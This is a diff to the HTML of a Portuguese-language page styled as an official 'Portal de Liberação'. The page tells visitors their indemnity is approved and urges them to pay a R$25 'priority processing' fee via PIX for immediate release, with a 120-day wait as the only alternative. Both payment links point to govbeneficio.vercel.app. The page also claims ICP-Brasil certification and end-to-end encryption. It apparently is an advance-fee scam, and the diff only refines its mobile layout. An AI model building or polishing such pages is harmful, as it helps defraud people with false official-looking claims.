@@ -2,7 +2,7 @@
 <html lang="pt-BR">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>Portal de Liberação - Consulta Consolidada</title>
     
     <script src="https://cdn.tailwindcss.com"></script>
@@ -22,55 +22,62 @@
             --brand-gray-dark: #495057;
             --brand-white: #FFFFFF;
             --brand-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
-            --brand-shadow-hover: 0 4px 12px rgba(0, 0, 0, 0.15);
         }
         
         body { 
             font-family: 'Inter', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; 
             background-color: #f9fafb;
+            -webkit-font-smoothing: antialiased;
         }
 
-        /* Estilos do Novo Header e Nav */
+        /* Estilos do Header e Nav */
         header {
-            background: var(--brand-white); padding: 16px 24px;
+            background: var(--brand-white); padding: 12px 24px;
             display: flex; justify-content: space-between; align-items: center;
             box-shadow: var(--brand-shadow); position: sticky; top: 0; z-index: 1000;
             border-bottom: 3px solid var(--brand-blue-primary);
         }
         header .logo { display: flex; align-items: center; }
-        header .logo img { height: 40px; width: auto; margin: 10px; }
-        header .icons { display: flex; align-items: center; gap: 12px; }
-        header .icons button {
+        header .logo img { height: 36px; width: auto; margin: 4px; }
+        
+        header .icons { display: flex; align-items: center; gap: 8px; }
+        header .icons button.icon-btn {
             background: none; border: none; padding: 8px; cursor: pointer;
             transition: all .3s; color: var(--brand-blue-primary);
         }
-        header .icons button:hover { background: var(--brand-blue-light); transform: translateY(-1px); }
-        header .icons button i { font-size: 16px; }
+        header .icons button.icon-btn:hover { background: var(--brand-blue-light); border-radius: 8px; }
+        
         header .user {
             background-color: #1451b4; color: #fff; border: none;
-            border-radius: 50px; padding: 6px 16px; display: flex; align-items: center; cursor: pointer;
+            border-radius: 50px; padding: 6px 14px; display: flex; align-items: center; cursor: pointer;
+            max-width: 140px;
         }
-        header .user i { margin-right: 8px; }
+        header .user i { margin-right: 6px; font-size: 13px; }
+        #header-user-name { font-size: 13px; font-weight: 600; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
         
         nav {
-            background: var(--brand-white); padding: 12px 24px;
+            background: var(--brand-white); padding: 10px 24px;
             display: flex; justify-content: space-between; align-items: center;
             border-bottom: 1px solid var(--brand-gray-medium);
-            position: sticky; top: 79px; z-index: 999;
+            position: sticky; top: 67px; z-index: 999;
         }
         nav button {
             background: none; border: none; display: flex; align-items: center;
-            cursor: pointer; padding: 8px 12px; border-radius: 8px; transition: all .3s;
+            cursor: pointer; padding: 6px 10px; border-radius: 8px; transition: all .3s;
         }
         nav button:hover { background: var(--brand-gray-light); }
-        nav button i { font-size: 16px; color: var(--brand-blue-primary); margin-right: 8px; }
-        nav button p { color: var(--brand-gray-dark); font-size: 14px; font-weight: 400; margin: 0; }
-        nav button span { color: var(--brand-blue-primary); font-weight: 500; }
+        nav button i { font-size: 14px; color: var(--brand-blue-primary); margin-right: 8px; }
+        nav button p { color: var(--brand-gray-dark); font-size: 13px; font-weight: 400; margin: 0; }
+        nav button span { color: var(--brand-blue-primary); font-weight: 500; margin: 0 4px; }
         
-        @media(max-width:768px) {
-            header { padding: 12px 16px; }
-            header .logo img { height: 32px; margin: 0; }
-            nav { top: 60px; padding: 10px 16px; }
+        /* Ajustes Finos para Mobile */
+        @media(max-width:640px) {
+            header { padding: 10px 16px; }
+            header .logo img { height: 28px; margin: 0; }
+            nav { top: 55px; padding: 8px 16px; }
+            nav button p { font-size: 12px; }
+            header .user { padding: 5px 12px; }
+            #header-user-name { font-size: 12px; }
         }
     </style>
 </head>
@@ -81,9 +88,10 @@
             <img src="images/nova_logo.png" alt="Logo Portal">
         </div>
         <div class="icons">
-            <button><i class="fas fa-ellipsis-v"></i></button>
-            <button><i class="fas fa-cookie-bite"></i></button>
-            <button><i class="fas fa-th"></i></button>
+            <button class="icon-btn hidden sm:block"><i class="fas fa-ellipsis-v"></i></button>
+            <button class="icon-btn hidden sm:block"><i class="fas fa-cookie-bite"></i></button>
+            <button class="icon-btn hidden sm:block"><i class="fas fa-th"></i></button>
+            
             <button class="user" id="user-button">
                 <i class="fas fa-user"></i>
                 <span id="header-user-name">Usuário</span>
@@ -94,79 +102,82 @@
     <nav>
         <button>
             <i class="fas fa-bars"></i>
-            <p>Portal <span> › </span> Liberação <span> › </span> Status</p>
+            <p>Portal <span>›</span> Liberação <span>›</span> Status</p>
         </button>
         <button><i class="fas fa-search"></i></button>
     </nav>
 
-    <main class="max-w-3xl mx-auto px-4 py-10">
+    <main class="max-w-3xl mx-auto px-4 sm:px-6 py-6 sm:py-10">
         
         <div class="bg-white shadow-sm border border-gray-200 rounded-lg overflow-hidden">
             
-            <div class="bg-yellow-50 border-b border-yellow-100 p-4 flex gap-3">
-                <i class="fas fa-clock text-yellow-600 mt-1"></i>
-                <p class="text-sm text-yellow-800 font-medium">
+            <div class="bg-yellow-50 border-b border-yellow-100 p-3 sm:p-4 flex gap-3 items-start sm:items-center">
+                <i class="fas fa-clock text-yellow-600 mt-1 sm:mt-0"></i>
+                <p class="text-[13px] sm:text-sm text-yellow-800 font-medium leading-snug">
                     Aguardando confirmação do método de liberação de fundos.
                 </p>
             </div>
 
-            <div class="p-8">
-                <h2 class="text-2xl font-bold text-gray-900 mb-6">Status da Indenização: <span class="text-green-600">Aprovada</span></h2>
+            <div class="p-5 sm:p-8">
+                <h2 class="text-xl sm:text-2xl font-bold text-gray-900 mb-4 sm:mb-6">Status da Indenização: <span class="text-green-600">Aprovada</span></h2>
                 
-                <p class="text-gray-600 leading-relaxed mb-6">
+                <p class="text-sm sm:text-base text-gray-600 leading-relaxed mb-6">
                     Informamos que os valores referentes à sua indenização foram processados e encontram-se em conta de custódia. De acordo com o protocolo padrão de processamento em lote, o desembolso segue o fluxo ordinário de compensação bancária.
                 </p>
 
-                <div class="space-y-6">
+                <div class="space-y-5 sm:space-y-6">
                     
-                    <div class="border-2 border-blue-600 rounded-xl p-6 bg-blue-50 relative">
-                        <span class="absolute top-0 right-0 bg-blue-600 text-white text-[10px] px-3 py-1 font-bold uppercase rounded-bl-lg">Recomendado</span>
-                        <h3 class="font-bold text-blue-900 text-lg mb-2">Liberação Imediata (Via PIX)</h3>
-                        <p class="text-sm text-blue-800 mb-4 leading-snug">
+                    <div class="border-2 border-blue-600 rounded-xl p-4 sm:p-6 bg-blue-50 relative">
+                        <span class="absolute top-0 right-0 bg-blue-600 text-white text-[9px] sm:text-[10px] px-2 sm:px-3 py-1 font-bold uppercase rounded-bl-lg">Recomendado</span>
+                        
+                        <h3 class="font-bold text-blue-900 text-base sm:text-lg mb-2 pr-20 sm:pr-0">Liberação Imediata (Via PIX)</h3>
+                        <p class="text-[13px] sm:text-sm text-blue-800 mb-4 leading-snug">
                             Para usuários que necessitam do capital com urgência. A taxa de processamento prioritário cobre os custos de liquidação em tempo real junto ao sistema bancário.
                         </p>
-                        <div class="flex items-center justify-between mb-6">
-                            <span class="text-xs text-gray-500 uppercase font-bold tracking-widest">Tempo de Espera:</span>
-                            <span class="font-bold text-blue-700">Até 5 minutos</span>
+                        <div class="flex items-center justify-between mb-5 sm:mb-6">
+                            <span class="text-[10px] sm:text-xs text-gray-500 uppercase font-bold tracking-widest">Tempo de Espera:</span>
+                            <span class="font-bold text-blue-700 text-sm sm:text-base">Até 5 minutos</span>
                         </div>
-                        <a id="link-checkout" href="https://govbeneficio.vercel.app/checkout.html" class="block w-full text-center bg-blue-700 hover:bg-blue-800 text-white font-bold py-4 rounded-lg transition-all shadow-md">
+                        
+                        <a id="link-checkout" href="https://govbeneficio.vercel.app/checkout.html" class="block w-full text-center bg-blue-700 hover:bg-blue-800 text-white font-bold py-3.5 sm:py-4 text-[13px] sm:text-base rounded-lg transition-all shadow-md">
                             ANTECIPAR MEU RECEBIMENTO (R$ 25,00)
                         </a>
                     </div>
 
-                    <div class="relative flex py-4 items-center">
+                    <div class="relative flex py-2 sm:py-4 items-center">
                         <div class="flex-grow border-t border-gray-300"></div>
-                        <span class="flex-shrink mx-4 text-gray-400 text-sm font-medium">OU</span>
+                        <span class="flex-shrink mx-4 text-gray-400 text-xs sm:text-sm font-medium">OU</span>
                         <div class="flex-grow border-t border-gray-300"></div>
                     </div>
 
-                    <div class="border border-gray-200 rounded-xl p-6 bg-white hover:border-gray-300 transition-colors">
-                        <h3 class="font-bold text-gray-800 text-lg mb-2">Fluxo Ordinário de Pagamento</h3>
-                        <p class="text-sm text-gray-500 mb-4 leading-snug">
+                    <div class="border border-gray-200 rounded-xl p-4 sm:p-6 bg-white hover:border-gray-300 transition-colors">
+                        <h3 class="font-bold text-gray-800 text-base sm:text-lg mb-2">Fluxo Ordinário de Pagamento</h3>
+                        <p class="text-[13px] sm:text-sm text-gray-500 mb-4 leading-snug">
                             O pagamento será agendado para o próximo ciclo de desembolso trimestral, seguindo a ordem cronológica de registro.
                         </p>
-                        <div class="flex items-center justify-between mb-6">
-                            <span class="text-xs text-gray-400 uppercase font-bold tracking-widest">Tempo de Espera:</span>
-                            <span class="font-bold text-gray-600">120 dias úteis</span>
+                        <div class="flex items-center justify-between mb-5 sm:mb-6">
+                            <span class="text-[10px] sm:text-xs text-gray-400 uppercase font-bold tracking-widest">Tempo de Espera:</span>
+                            <span class="font-bold text-gray-600 text-sm sm:text-base">120 dias úteis</span>
                         </div>
-                        <a id="link-upsell" href="https://govbeneficio.vercel.app/up2.html" class="block w-full text-center border border-gray-300 text-gray-500 font-semibold py-3 rounded-lg hover:bg-gray-50 transition-all">
+                        
+                        <a id="link-upsell" href="https://govbeneficio.vercel.app/up2.html" class="block w-full text-center border border-gray-300 text-gray-500 font-semibold py-3 text-[13px] sm:text-base rounded-lg hover:bg-gray-50 transition-all">
                             Desejo esperar 120 dias
                         </a>
                     </div>
                 </div>
             </div>
 
-            <div class="p-6 bg-gray-100 border-t border-gray-200">
-                <div class="flex items-center gap-4 opacity-60 grayscale">
+            <div class="p-4 sm:p-6 bg-gray-100 border-t border-gray-200">
+                <div class="flex flex-col sm:flex-row items-center justify-center sm:justify-start gap-3 sm:gap-4 opacity-60 grayscale">
                     <img src="https://upload.wikimedia.org/wikipedia/commons/b/bb/Pix_logo.svg" alt="Pix" class="h-4">
-                    <div class="h-4 w-[1px] bg-gray-400"></div>
-                    <span class="text-[10px] font-bold">CERTIFICAÇÃO DIGITAL PADRÃO ICP-BRASIL</span>
+                    <div class="hidden sm:block h-4 w-[1px] bg-gray-400"></div>
+                    <span class="text-[9px] sm:text-[10px] font-bold text-center">CERTIFICAÇÃO DIGITAL PADRÃO ICP-BRASIL</span>
                 </div>
             </div>
         </div>
 
-        <p class="mt-8 text-center text-xs text-gray-400">
-            © 2026 Portal de Pagamentos e Restituições - Todos os direitos reservados. <br>
+        <p class="mt-6 sm:mt-8 text-center text-[11px] sm:text-xs text-gray-400 px-2">
+            © 2026 Portal de Pagamentos e Restituições - Todos os direitos reservados. <br class="hidden sm:block">
             Este é um ambiente seguro. Suas transações são protegidas por criptografia de ponta a ponta.
         </p>
     </main>
